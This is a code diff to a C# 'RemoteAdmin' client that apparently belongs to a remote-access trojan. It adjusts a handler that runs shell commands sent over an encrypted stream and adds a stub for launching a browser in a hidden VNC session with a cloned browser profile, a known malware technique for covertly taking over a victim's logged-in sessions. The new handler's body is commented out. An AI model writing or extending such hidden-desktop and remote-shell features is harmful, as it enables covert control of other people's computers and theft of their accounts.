@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Net.Security;
 using System.Net.Sockets;
+using System.Runtime.InteropServices;
 using System.ServiceProcess;
 using System.Text;
 using System.Threading.Tasks;
@@ -17,9 +18,11 @@ namespace RemoteAdmin.Client.Networking
 {
     internal class CommandHandler
     {
+        [DllImport("user32.dll")]
+        private static extern int GetSystemMetrics(int nIndex);
 
-       public static async Task HandleShellCommand(SslStream stream, string command, string shellType)
-        {
+        public static async Task HandleShellCommand(SslStream stream, string command, string shellType)
+       {
             try
             {
                 string fileName;
@@ -380,5 +383,37 @@ namespace RemoteAdmin.Client.Networking
                 await NetworkHelper.SendMessageAsync(stream, response);
             }
         }
+
+        public static async Task HandleHvncLaunchBrowser(SslStream stream, HvncLaunchBrowserMessage browserMsg)
+        {
+            try
+            {
+                //if (_hvncHandler != null)
+                //{
+                //    await _hvncHandler.LaunchBrowserAsync(
+                //        browserMsg.BrowserType,
+                //        browserMsg.CloneProfile);
+                //
+                //    var response = new OperationResultMessage
+                //    {
+                //        Success = true,
+                //        Message = $"Browser launched: {browserMsg.BrowserType}"
+                //    };
+                //    await NetworkHelper.SendMessageAsync(stream, response);
+                //}
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"Error launching browser in HVNC: {ex.Message}");
+
+                var response = new OperationResultMessage
+                {
+                    Success = false,
+                    Message = $"Failed to launch browser: {ex.Message}"
+                };
+                await NetworkHelper.SendMessageAsync(stream, response);
+            }
+        }
+
     }
 }
